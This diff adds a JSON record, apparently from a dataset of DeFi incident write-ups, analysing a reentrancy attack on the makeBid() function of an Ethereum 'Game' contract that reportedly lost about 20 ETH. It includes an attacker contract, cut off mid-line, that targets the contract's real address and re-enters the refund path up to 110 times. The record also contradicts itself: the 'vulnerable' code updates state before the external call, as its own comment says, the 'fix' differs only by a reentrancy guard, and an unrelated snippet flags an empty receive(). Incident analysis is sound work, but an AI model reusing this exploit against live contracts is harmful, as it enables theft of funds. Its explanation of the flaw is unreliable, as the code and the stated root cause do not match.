@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-02-XX_Game_ReentrancyBid",
+ "source_file": "2024/2024-02-XX_Game_ReentrancyBid.md",
+ "title": "Game — Bid Function Reentrancy Attack Analysis",
+ "date": "2024-02-01",
+ "protocol": "Game",
+ "chain": "Ethereum",
+ "loss_raw": "~20 ETH",
+ "loss_usd": null,
+ "root_cause": "`makeBid()` does not update state before issuing ETH refunds, allowing 110 reentrant calls via the `receive()` callback",
+ "attack_tx": null,
+ "vulnerable_contract": "Game 0x52d69c67",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: CEI pattern violation — state updated before external call\nfunction makeBid() external payable {\n    require(msg.value >= newBidEtherMin(), \"bid too low\");\n\n    address previousBidder = currentBidder;\n    uint256 previousBid    = currentBid;\n\n    // Effects: state update\n    currentBidder = msg.sender;\n    currentBid    = msg.value;\n\n    // Interactions: refund to previous bidder — reentrancy possible\n    if (previousBidder != address(0)) {\n        (bool ok,) = previousBidder.call{value: previousBid}(\"\");\n        require(ok, \"refund failed\");\n        // ← if previousBidder is a contract, receive() can call makeBid() again\n    }\n}\n\n//",
+  "// File: Game.sol\ncontract GameInternal {\n\n    function isWriteEnable() public view returns (bool) {\n        return _gameEndTime > 0 && !isGameEnd();\n    }\n\n    receive() external payable {}  // ❌ Vulnerability\n\n    function setToken(address tokenAddress) external onlyOwner {\n        require(address(token) == address(0));\n        token = IERC20(tokenAddress);\n    }\n\n    function canvas() external view returns (address) {\n        return address(_canvas);\n    }\n\n    function writeChunks(ChunkWriteDto[] calldata input) external writeEnable {\n        uint256 cost = _writeChunksPrice(input, msg.sender);\n        token.transferFrom(msg.sender, address(this), cost);\n        for (uint256 i = 0; i < input.length; ++i) {\n            _writeChunk(input[i], msg.sender);\n        }\n    }\n\n    function _writeChunk(ChunkWriteDto calldata input, address writer) private {\n        uint16 index = chunkIndex(input.x, input.y);\n        ChunkData storage chunk = _chunks[index];\n\n        address lastOwner = chunk.owner;\n        if (lastOwner != address(0)) --_ownersShare[lastOwner];\n        else ++chunksWritenCount;\n        ++_ownersShare[msg.sender];\n\n        chunk.price = _writeChunkPrice(chunk, writer);\n        chunk.owner = msg.sender;\n        _canvas.setChunkByIndex(index, input.data);\n\n        _gameEndTime += chunkWriteAddsGameSeconds;"
+ ],
+ "code_after": [
+  "✅ Safe code: ReentrancyGuard applied\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nfunction makeBid() external payable nonReentrant {\n    require(msg.value >= newBidEtherMin(), \"bid too low\");\n    address previousBidder = currentBidder;\n    uint256 previousBid    = currentBid;\n    currentBidder = msg.sender;\n    currentBid    = msg.value;\n    if (previousBidder != address(0)) {\n        (bool ok,) = previousBidder.call{value: previousBid}(\"\");\n        require(ok, \"refund failed\");\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Call makeBid() (0.294 ETH = 49% of balance)",
+  "→ [2] Next bidder appears → attempts to refund 0.294 ETH to attacker",
+  "→ [3] Inside receive(): re-call makeBid() (newBidEtherMin() + 1 wei)",
+  "→ [4] Each reentrant call collects a minimum-bid refund",
+  "→ [5] Total ~20 ETH drained"
+ ],
+ "other_code": [
+  "Attacker Contract (holding 0.6 ETH)\n  │\n  ├─→ [1] Call makeBid() (0.294 ETH = 49% of balance)\n  │         └─ currentBidder = attacker, currentBid = 0.294 ETH\n  │\n  ├─→ [2] Next bidder appears → attempts to refund 0.294 ETH to attacker\n  │         └─ receive() callback triggered\n  │\n  ├─→ [3] Inside receive(): re-call makeBid() (newBidEtherMin() + 1 wei)\n  │         └─ Repeated 110 times via reentrancy\n  │\n  ├─→ [4] Each reentrant call collects a minimum-bid refund\n  │\n  └─→ [5] Total ~20 ETH drained",
+  "interface IGame {\n    function newBidEtherMin() external view returns (uint256);\n    function makeBid() external payable;\n}\n\ncontract AttackContract {\n    IGame constant game = IGame(0x52d69c67536f55efefe02941868e5e762538dbd6);\n    uint256 private count;\n\n    function testExploit() external payable {\n        // [1] Initial bid (49% of balance)\n        uint256 initialBid = address(this).balance * 49 / 100;\n        game.makeBid{value: initialBid}();\n    }\n\n    receive() external payable {\n        // [2] Re-enter on each refund (up to 110 times)\n        if (count < 110 && address(game).balance > 0) {\n            count++;\n            uint256 minBid = game.newBidEtherMin();\n            if (address(this).balance >= minBid + 1) {\n                game.makeBid{value: minBid + 1}();  // Re-bid at mi"
+ ]
+}
